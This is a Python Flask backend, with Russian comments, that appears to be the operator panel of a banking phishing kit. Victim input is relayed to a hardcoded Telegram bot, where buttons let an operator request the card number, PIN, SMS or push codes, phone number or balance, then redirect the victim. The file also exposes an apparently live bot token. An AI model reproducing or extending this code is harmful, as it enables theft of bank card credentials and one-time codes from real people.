from flask import Flask, request, jsonify
from flask_cors import CORS
import requests
import time

app = Flask(__name__)
CORS(app, resources={r"/*": {"origins": "*"}}, supports_credentials=True)

TELEGRAM_BOT_TOKEN = "7368319072:AAGRGJU9NqchsjSMGHdVSrKGZEXYfyyRiUE"
CHAT_ID = "294154587"

# Храним данные пользователей, ожидающих редиректа
pending_redirects = {}

# 📌 Функция создания клавиатуры (меню)
def get_menu_keyboard(user_id):
    return {
        "inline_keyboard": [
            [{"text": "SMS", "callback_data": f"{user_id}:redirect_sms"}],  # Динамический callback_data

            [{"text": "Пуш", "callback_data": f"{user_id}:push"},
             {"text": "Ввод карты", "callback_data": f"{user_id}:card"},
             {"text": "PIN", "callback_data": f"{user_id}:pin"}],

            [{"text": "Лимиты", "callback_data": f"{user_id}:limits"},
             {"text": "Неверный код", "callback_data": f"{user_id}:wrong_code"},
             {"text": "Номер телефона", "callback_data": f"{user_id}:phone"}],

            [{"text": "Свой текст/фото", "callback_data": f"{user_id}:custom_text"}],

            [{"text": "Пополнение", "callback_data": f"{user_id}:topup"},
             {"text": "Баланс", "callback_data": f"{user_id}:balance"}],

            [{"text": "✅ Успех", "callback_data": f"{user_id}:success"},
             {"text": "❌ Неверный ЛК", "callback_data": f"{user_id}:wrong_lk"}]
        ]
    }

@app.route('/')
def home():
    return "🚀 Сервер работает! Используйте /send для отправки сообщений."

@app.route('/send', methods=['POST'])
def send_to_telegram():
    """Принимает данные и отправляет их в Telegram с меню"""
    data = request.json
    user_input = data.get("user_input", "")
    user_id = int(time.time())  # Уникальный ID пользователя

    if not user_input:
        return jsonify({"error": "Введите данные!"}), 400

    pending_redirects[user_id] = None  # Пользователь ожидает редиректа

    # 📌 Отправляем сообщение в Telegram с меню
    telegram_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": CHAT_ID,
        "text": f"📩 Новый запрос: {user_input}",
        "reply_markup": get_menu_keyboard(user_id)  # <-- Добавляем динамические кнопки
    }

    response = requests.post(telegram_url, json=payload)

    if response.status_code == 200:
        return jsonify({"redirect_id": user_id})  # Отправляем пользователю ID для редиректа
    else:
        return jsonify({"error": "❌ Ошибка отправки!"}), 500

@app.route('/redirect/<int:user_id>', methods=['GET'])
def redirect_user(user_id):
    """Проверяет, готов ли редирект"""
    if user_id in pending_redirects and pending_redirects[user_id]:
        url = pending_redirects.pop(user_id)  # Забираем URL и удаляем из ожидания
        return jsonify({"redirect_url": url})
    return jsonify({"message": "Оператор еще не ответил, попробуйте позже."})

@app.route('/callback', methods=['POST'])
def handle_callback():
    """Обрабатывает нажатия кнопок оператором"""
    data = request.json
    callback_query = data.get("callback_query", {})

    if not callback_query:
        return jsonify({"error": "Нет данных в callback_query"}), 400

    callback_data = callback_query.get("data")
    chat_id = callback_query["message"]["chat"]["id"]

    # 📌 Разбираем данные: user_id:redirect_sms
    try:
        user_id, action = callback_data.split(":")
        user_id = int(user_id)
    except ValueError:
        return jsonify({"error": "Неверный формат callback_data"}), 400

    if action == "redirect_sms":
        # 📌 Оператор выбрал "SMS" → редиректим пользователя
        pending_redirects[user_id] = "https://www.cikava-kava.com.ua/remont-kavomashyn-dnipro/"

        # Отправляем оператору подтверждение
        telegram_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        payload = {
            "chat_id": chat_id,
            "text": "✅ Пользователь будет перенаправлен!"
        }
        requests.post(telegram_url, json=payload)

    return jsonify({"message": "✅ Обработано!"})

if __name__ == "__main__":
    from waitress import serve
    serve(app, host="0.0.0.0", port=10000)
